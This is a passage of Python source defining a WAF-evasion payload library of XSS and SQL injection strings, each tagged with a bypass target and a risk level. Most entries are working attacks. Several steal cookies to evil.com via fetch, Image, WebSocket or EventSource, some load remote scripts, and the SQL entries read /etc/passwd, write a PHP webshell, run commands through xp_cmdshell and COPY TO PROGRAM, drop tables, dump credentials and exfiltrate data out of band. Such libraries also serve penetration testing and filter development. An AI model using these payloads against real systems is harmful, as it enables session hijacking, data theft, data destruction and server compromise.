            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xss_fetch_exfil': {
            'payload': '<script>fetch("https://evil.com/?c="+document.cookie)</script>',
            'description': 'Cookie exfiltration via fetch',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xss_img_exfil': {
            'payload': '<script>new Image().src="https://evil.com/?c="+document.cookie</script>',
            'description': 'Cookie exfiltration via Image object',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xss_wss_stealthy': {
            'payload': '<script>var ws=new WebSocket("wss://evil.com");ws.onopen=function(){ws.send(document.cookie)}</script>',
            'description': 'Cookie exfiltration via WebSocket',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xss_mutation_observer': {
            'payload': '<script>new MutationObserver(function(m){fetch("//evil.com?"+document.cookie)}).observe(document,{childList:true,subtree:true})</script>',
            'description': 'Persistent XSS via MutationObserver',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xss_service_worker_steal': {
            'payload': '<script>navigator.serviceWorker.register("//evil.com/sw.js")</script>',
            'description': 'XSS to register malicious service worker',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xss_postmessage': {
            'payload': '<script>window.opener.postMessage("<script>alert(1)</script>","*")</script>',
            'description': 'XSS via postMessage to opener',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_importmap': {
            'payload': '<script type="importmap">{"imports":{"x":"javascript:alert(1)"}}</script><script type="module">import "x"</script>',
            'description': 'XSS via import map (modern browsers)',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_trusted_types_bypass': {
            'payload': '<script>trustedTypes.createPolicy("default",{createHTML:s=>s});document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
            'description': 'TrustedTypes bypass template',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_dom_write_plain': {
            'payload': '"><script>document.write(unescape("%3Cscript%3Ealert(1)%3C/script%3E"))</script>',
            'description': 'DOM XSS via document.write with unescape',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_innertext': {
            'payload': '"><script>document.getElementById("test").innerText="<img onerror=alert(1) src=x>"</script>',
            'description': 'DOM XSS via innerText assignment',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_assign_src': {
            'payload': '"><script>document.images[0].src="javascript:alert(1)"</script>',
            'description': 'DOM XSS via image src assignment',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_stored_payload_basic': {
            'payload': '<script src=//evil.com/x.js></script>',
            'description': 'Remote script tag load',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xss_script_no_close': {
            'payload': '<script>alert(1)//</script>',
            'description': 'Script tag with JS comment to avoid close tag check',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_reflected_json': {
            'payload': '"}; alert(1); //{"',
            'description': 'XSS in reflected JSON context',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_onhashchange': {
            'payload': '<body onhashchange=alert(1)><a href=#>click</a>',
            'description': 'XSS via onhashchange event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_onbeforeunload': {
            'payload': '<body onbeforeunload=alert(1)>',
            'description': 'XSS via onbeforeunload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xss_onscroll': {
            'payload': '<div style="overflow:scroll;height:100px" onscroll=alert(1)><br/><br/><br/><br/><br/></div>',
            'description': 'XSS via onscroll event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xss_css_import': {
            'payload': '<style>@import url("javascript:alert(1)");</style>',
            'description': 'XSS via CSS @import with javascript: URI',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_waf_bypass_tag_concat': {
            'payload': '<img src=x:alert(1) onerror=eval(src)>',
            'description': 'XSS eval src via onerror',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_obfuscated_alert': {
            'payload': '<script>a=["ale","rt"];window[a.join()](1)</script>',
            'description': 'Obfuscated alert via array join',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_new_function': {
            'payload': '<script>(new Function("ale"+"rt(1)") ())</script>',
            'description': 'XSS via new Function with string concat',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_source': {
            'payload': '<script>var s=new EventSource("//evil.com/sse");s.onmessage=e=>eval(e.data)</script>',
            'description': 'Persistent XSS via EventSource',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xss_window_name': {
            'payload': '<script>window.name="alert(1)";eval(window.name)</script>',
            'description': 'XSS via window.name persistence',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_reflect_url_param': {
            'payload': '"><img src=x onerror=alert(document.location)>',
            'description': 'XSS to expose current URL location',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_arbitrary_js_proto': {
            'payload': '<script>Object.prototype.innerHTML="<img/onerror=alert(1) src=x>"</script>',
            'description': 'XSS via Object prototype pollution',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_iframe_onload': {
            'payload': '<iframe onload=alert(1)></iframe>',
            'description': 'XSS via iframe onload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_mxss_xml_namespace': {
            'payload': '<a xmlns:a=\'http://www.w3.org/1999/xhtml\'><a:script>alert(1)</a:script></a>',
            'description': 'mXSS via XML namespace in HTML5',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_js_url_encoded': {
            'payload': 'javas\tcript:alert(1)',
            'description': 'javascript: URI with tab to bypass filter',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_js_url_newline': {
            'payload': 'java\nscript:alert(1)',
            'description': 'javascript: URI with newline bypass',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_waf_uppercase_event': {
            'payload': '<img SRC=x ONERROR=alert(1)>',
            'description': 'Uppercase attribute names WAF bypass',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        }
    }
    
    # SQL Injection Bypass Payloads
    SQLI_PAYLOADS = {
        'sqli_union_select': {
            'payload': "' UNION SELECT NULL,NULL,NULL--",
            'description': 'Basic UNION SELECT injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_comment_inline': {
            'payload': "' OR /**/ '1'='1",
            'description': 'Inline comment bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_double_dash': {
            'payload': "' OR 1=1--",
            'description': 'Double dash comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_hex_encoded': {
            'payload': "' OR 0x313d31--",
            'description': 'Hex encoded condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_char_function': {
            'payload': "' OR CHAR(49)=CHAR(49)--",
            'description': 'Using CHAR function',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_concat': {
            'payload': "' OR 'a'||'b'='ab'--",
            'description': 'String concatenation',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_scientific_notation': {
            'payload': "' OR 1e0=1--",
            'description': 'Scientific notation bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_nested_comments': {
            'payload': "' OR /**/1/**/=/**/1--",
            'description': 'Multiple inline comments',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mixed_case': {
            'payload': "' Or 1=1--",
            'description': 'Mixed case keywords',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_whitespace_variation': {
            'payload': "'\tOR\n1=1--",
            'description': 'Tab and newline as whitespace',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_url_encoded': {
            'payload': "%27%20OR%201=1--",
            'description': 'URL encoded injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_double_url_encoded': {
            'payload': "%2527%2520OR%25201%253D1--",
            'description': 'Double URL encoded',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_buffer_overflow': {
            'payload': "' OR 1=1 LIMIT 1 OFFSET " + "1" * 1000 + "--",
            'description': 'Buffer overflow attempt',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'sqli_null_byte': {
            'payload': "' OR 1=1%00--",
            'description': 'Null byte injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_time_based': {
            'payload': "' AND SLEEP(5)--",
            'description': 'Time-based blind SQLi',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_stacked_queries': {
            'payload': "'; DROP TABLE users--",
            'description': 'Stacked query injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_substring': {
            'payload': "' OR SUBSTRING(version(),1,1)='5'--",
            'description': 'Substring function',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_in_operator': {
            'payload': "' OR 1 IN (1,2,3)--",
            'description': 'IN operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_between': {
            'payload': "' OR 1 BETWEEN 0 AND 2--",
            'description': 'BETWEEN operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_like': {
            'payload': "' OR 'a' LIKE 'a'--",
            'description': 'LIKE operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # MySQL-specific payloads
        'sqli_mysql_version': {
            'payload': "' UNION SELECT @@version,NULL,NULL--",
            'description': 'MySQL version extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_user': {
            'payload': "' UNION SELECT user(),NULL,NULL--",
            'description': 'MySQL current user extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_dbs': {
            'payload': "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
            'description': 'MySQL enumerate all databases',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_tables': {
            'payload': "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
            'description': 'MySQL enumerate tables',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_columns': {
            'payload': "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            'description': 'MySQL enumerate columns',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_sleep': {
            'payload': "' AND SLEEP(5)--",
            'description': 'MySQL time-based blind injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_benchmark': {
            'payload': "' AND BENCHMARK(5000000,MD5('test'))--",
            'description': 'MySQL BENCHMARK for timing attacks',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_load_file': {
            'payload': "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
            'description': 'MySQL file read via LOAD_FILE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_outfile': {
            'payload': "' UNION SELECT '<?php system($_GET[cmd]);?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--",
            'description': 'MySQL write webshell via INTO OUTFILE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_error_extractvalue': {
            'payload': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            'description': 'MySQL error-based extraction via EXTRACTVALUE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_error_updatexml': {
            'payload': "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
            'description': 'MySQL error-based extraction via UPDATEXML',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_hex_bypass': {
            'payload': "' UNION SELECT 0x61646d696e,NULL,NULL--",
            'description': 'MySQL hex encoding to bypass filters',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_concat_ws': {
            'payload': "' UNION SELECT CONCAT_WS(0x3a,username,password),NULL,NULL FROM users--",
            'description': 'MySQL CONCAT_WS to join credentials',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # PostgreSQL-specific payloads
        'sqli_pgsql_version': {
            'payload': "' UNION SELECT version(),NULL,NULL--",
            'description': 'PostgreSQL version extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_current_user': {
            'payload': "' UNION SELECT current_user,NULL,NULL--",
            'description': 'PostgreSQL current user',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_tables': {
            'payload': "' UNION SELECT string_agg(tablename,','),NULL,NULL FROM pg_tables WHERE schemaname='public'--",
            'description': 'PostgreSQL enumerate tables',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_sleep': {
            'payload': "' AND (SELECT 1 FROM pg_sleep(5))--",
            'description': 'PostgreSQL time-based blind injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_error': {
            'payload': "' AND CAST((SELECT version()) AS INTEGER)--",
            'description': 'PostgreSQL error-based extraction via CAST',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_copy': {
            'payload': "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--",
            'description': 'PostgreSQL RCE via COPY TO PROGRAM',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_lo_import': {
            'payload': "'; SELECT lo_import('/etc/passwd')--",
            'description': 'PostgreSQL large object file read',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # MSSQL-specific payloads
        'sqli_mssql_version': {
            'payload': "' UNION SELECT @@VERSION,NULL,NULL--",
            'description': 'MSSQL version string',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_user': {
            'payload': "' UNION SELECT SYSTEM_USER,NULL,NULL--",
            'description': 'MSSQL current user',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_xp_cmdshell': {
            'payload': "'; EXEC xp_cmdshell('whoami')--",
            'description': 'MSSQL xp_cmdshell RCE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_enable_xp': {
            'payload': "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
            'description': 'MSSQL enable xp_cmdshell',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_waitfor': {
            'payload': "' WAITFOR DELAY '0:0:5'--",
            'description': 'MSSQL time-based blind injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_tables': {
            'payload': "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--",
            'description': 'MSSQL enumerate user tables',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_openrowset': {
            'payload': "'; INSERT INTO OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=x','SELECT 1') SELECT @@version--",
            'description': 'MSSQL OOB data exfiltration via OPENROWSET',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_mssql_bulk_insert': {
            'payload': "'; BULK INSERT users FROM '\\\\evil.com\\share\\evil.csv'--",
            'description': 'MSSQL BULK INSERT UNC path',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # Oracle-specific payloads
        'sqli_oracle_version': {
            'payload': "' UNION SELECT banner,NULL,NULL FROM v$version--",
            'description': 'Oracle database version',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_oracle_tables': {
            'payload': "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE ROWNUM=1--",
            'description': 'Oracle enumerate tables',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_oracle_sleep': {
            'payload': "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--",
            'description': 'Oracle time-based blind via DBMS_PIPE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_oracle_utl_http': {
            'payload': "' UNION SELECT UTL_HTTP.REQUEST('http://evil.com/'||user),NULL,NULL FROM dual--",
            'description': 'Oracle OOB exfiltration via UTL_HTTP',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_oracle_dual': {
            'payload': "' UNION SELECT NULL FROM dual--",
            'description': 'Oracle UNION SELECT using dual table',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # WAF evasion techniques
        'sqli_waf_scientific': {
            'payload': "1e0 UNION/**/SELECT/**/1,2,3--",
            'description': 'Scientific notation to confuse WAF tokenizer',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_url_encoded': {
            'payload': "%27%20OR%20%271%27%3D%271",
            'description': 'URL encoded SQL injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_double_encoded': {
            'payload': "%2527%2520OR%25201%253D1",
            'description': 'Double URL encoded SQL injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_unicode_space': {
            'payload': "' OR%C2%A01=1--",
            'description': 'Non-breaking space (U+00A0) bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_zero_width': {
            'payload': "' OR 1\u200b=\u200b1--",
            'description': 'Zero-width space injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_http_param_pollution': {
            'payload': "id=1&id=1 UNION SELECT 1,2,3--",
            'description': 'HTTP parameter pollution for WAF bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_chunked': {
            'payload': "' UN/**/ION SE/**/LECT 1,2,3--",
            'description': 'Comments splitting keywords for WAF bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_case_mix': {
            'payload': "' uNioN sElEcT 1,2,3--",
            'description': 'Mixed case keywords for WAF bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_line_comments': {
            'payload': "'\n OR\n 1=1\n--",
            'description': 'Newlines as whitespace for WAF bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_waf_tab_bypass': {
            'payload': "'\tOR\t1=1--",
            'description': 'Tabs as whitespace for WAF bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Boolean-based blind injection
        'sqli_blind_bool_true': {
            'payload': "' AND 1=1--",
            'description': 'Boolean blind - always true condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_bool_false': {
            'payload': "' AND 1=2--",
            'description': 'Boolean blind - always false condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_substring': {
            'payload': "' AND SUBSTRING(username,1,1)='a'--",
            'description': 'Boolean blind substring extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_length': {
            'payload': "' AND LENGTH(password)>5--",
            'description': 'Boolean blind length enumeration',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_ascii': {
            'payload': "' AND ASCII(SUBSTRING(username,1,1))>97--",
            'description': 'Boolean blind ASCII comparison',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_bitshift': {
            'payload': "' AND (SELECT 1 WHERE ASCII(SUBSTRING(username,1,1))>>1)=48--",
            'description': 'Bit-shifting for character extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # UNION-based payloads
        'sqli_union_4col': {
            'payload': "' UNION SELECT NULL,NULL,NULL,NULL--",
            'description': 'UNION SELECT with 4 columns',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_union_5col': {
            'payload': "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            'description': 'UNION SELECT with 5 columns',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_union_string_detect': {
            'payload': "' UNION SELECT 'a',NULL,NULL--",
            'description': 'UNION SELECT to find string column',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_union_orderby_enum': {
            'payload': "' ORDER BY 1--",
            'description': 'ORDER BY to enumerate column count',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_union_orderby_5': {
            'payload': "' ORDER BY 5--",
            'description': 'ORDER BY 5 for column count detection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Error-based injection
        'sqli_error_floor': {
            'payload': "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            'description': 'MySQL error-based via FLOOR RAND',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_error_exp': {
            'payload': "' AND EXP(~(SELECT * FROM (SELECT version())x))--",
            'description': 'MySQL error-based via EXP overflow',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_error_geometrycollection': {
            'payload': "' AND geometrycollection((select * from(select * from(select@@version)f)x))--",
            'description': 'MySQL error-based via spatial functions',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # JSON SQLi
        'sqli_json_injection': {
            'payload': '{"username": "admin\'--", "password": "anything"}',
            'description': 'SQL injection in JSON parameter',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_json_operator': {
            'payload': '{"$where": "this.username == \'admin\'"}',
            'description': 'JSON-based injection with $where',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Second-order SQLi
        'sqli_second_order': {
            'payload': "admin'--",
            'description': 'Second-order SQL injection username',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Integer-based SQLi
        'sqli_integer_or': {
            'payload': "1 OR 1=1",
            'description': 'Integer-based OR injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_integer_and': {
            'payload': "1 AND 1=2",
            'description': 'Integer-based AND false condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_integer_xor': {
            'payload': "1 XOR 1",
            'description': 'XOR-based blind injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Comment variations
        'sqli_comment_hash': {
            'payload': "' OR 1=1#",
            'description': 'MySQL hash comment injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_comment_percent': {
            'payload': "' OR 1=1%00",
            'description': 'Null byte as comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_comment_multi_end': {
            'payload': "' OR 1=1/*",
            'description': 'Unclosed multi-line comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Stacked queries
        'sqli_stacked_mysql': {
            'payload': "'; SELECT SLEEP(5)--",
            'description': 'Stacked query time-based blind (MySQL)',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_stacked_insert': {
            'payload': "'; INSERT INTO users (username,password) VALUES ('hacked','password')--",
            'description': 'Stacked query INSERT',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_stacked_drop': {
            'payload': "'; DROP TABLE users--",
            'description': 'Stacked query DROP TABLE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Bypass via encoding/functions
        'sqli_char_func': {
            'payload': "' UNION SELECT CHAR(117,115,101,114),NULL,NULL--",
            'description': 'Using CHAR() to encode string',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_unhex': {
            'payload': "' UNION SELECT UNHEX('61646d696e'),NULL,NULL--",
            'description': 'Using UNHEX() to encode string',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_if_conditional': {
            'payload': "' AND IF(1=1,SLEEP(3),0)--",
            'description': 'MySQL IF conditional time-based blind',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
